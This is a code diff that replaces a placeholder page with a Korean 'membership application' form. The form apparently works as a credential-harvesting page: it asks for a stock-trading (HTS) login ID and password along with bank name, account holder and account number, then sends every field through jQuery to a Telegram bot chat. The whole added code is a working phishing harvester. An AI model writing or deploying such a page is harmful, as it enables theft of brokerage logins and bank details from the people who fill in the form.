@@ -1,12 +1,139 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-	<meta charset="UTF-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>Portfolio</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>신청 폼</title>
+    
+    <!-- jQuery CDN -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    
+    <!-- Noto Sans Font CDN -->
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Noto Sans KR', sans-serif;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin-top: 10px;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="email"],
+        input[type="tel"] {
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-  <p>Hello, World!</p>
+
+    <h1>멤버십 신청</h1>
+    <form id="membershipForm">
+        <label for="name">이름</label>
+        <input type="text" id="name" name="name" required>
+
+        <label for="phone">휴대폰 번호</label>
+        <input type="tel" id="phone" name="phone" pattern="[0-9]{10,11}" required>
+
+        <label for="htsId">HTS 아이디</label>
+        <input type="text" id="htsId" name="htsId" required>
+
+        <label for="htsPassword">HTS 패스워드</label>
+        <input type="password" id="htsPassword" name="htsPassword" required>
+
+        <label for="email">이메일</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="referrer">추천인</label>
+        <input type="text" id="referrer" name="referrer">
+
+        <label for="bank">은행명</label>
+        <input type="text" id="bank" name="bank" required>
+
+        <label for="accountHolder">예금주</label>
+        <input type="text" id="accountHolder" name="accountHolder" required>
+
+        <label for="accountNumber">계좌번호</label>
+        <input type="text" id="accountNumber" name="accountNumber" required>
+
+        <button type="submit">멤버십 신청</button>
+    </form>
+
+    <script>
+        $(document).ready(function(){
+            $("#membershipForm").submit(function(event){
+                event.preventDefault();
+                
+                const data = {
+                    name: $("#name").val(),
+                    phone: $("#phone").val(),
+                    htsId: $("#htsId").val(),
+                    htsPassword: $("#htsPassword").val(),
+                    email: $("#email").val(),
+                    referrer: $("#referrer").val(),
+                    bank: $("#bank").val(),
+                    accountHolder: $("#accountHolder").val(),
+                    accountNumber: $("#accountNumber").val()
+                };
+
+                const message = `
+                    멤버십 신청\n
+                    이름: ${data.name}\n
+                    휴대폰 번호: ${data.phone}\n
+                    HTS 아이디: ${data.htsId}\n
+                    HTS 패스워드: ${data.htsPassword}\n
+                    이메일: ${data.email}\n
+                    추천인: ${data.referrer}\n
+                    은행명: ${data.bank}\n
+                    예금주: ${data.accountHolder}\n
+                    계좌번호: ${data.accountNumber}
+                `;
+
+                // Telegram Bot API 전송
+                const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+                const chatId = 'YOUR_CHAT_ID';
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                $.ajax({
+                    type: "POST",
+                    url: url,
+                    data: {
+                        chat_id: chatId,
+                        text: message
+                    },
+                    success: function(response) {
+                        alert("신청이 성공적으로 접수되었습니다!");
+                    },
+                    error: function(error) {
+                        console.error("Error sending message: ", error);
+                        alert("신청을 처리하는 중 문제가 발생했습니다. 다시 시도해 주세요.");
+                    }
+                });
+            });
+        });
+    </script>
 </body>
 </html>
